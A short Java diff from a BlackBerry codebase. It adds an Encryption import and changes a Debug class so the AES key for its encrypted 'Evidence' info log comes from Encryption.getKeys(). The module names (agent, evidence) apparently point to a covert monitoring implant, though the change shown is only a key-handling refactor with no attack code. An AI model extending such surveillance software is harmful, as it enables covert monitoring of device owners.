@@ -17,6 +17,7 @@ import net.rim.device.api.util.NumberUtilities;
 import blackberry.agent.Agent;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
+import blackberry.crypto.Encryption;
 import blackberry.evidence.Evidence;
 import blackberry.fs.Path;
 import blackberry.utils.Check;
@@ -328,7 +329,7 @@ public final class Debug {
                 return;
             }
 
-            logInfo = new Evidence(Agent.AGENT_INFO, false, Keys.getInstance()
+            logInfo = new Evidence(Agent.AGENT_INFO, false, Encryption.getKeys()
                     .getAesKey());
         }
 
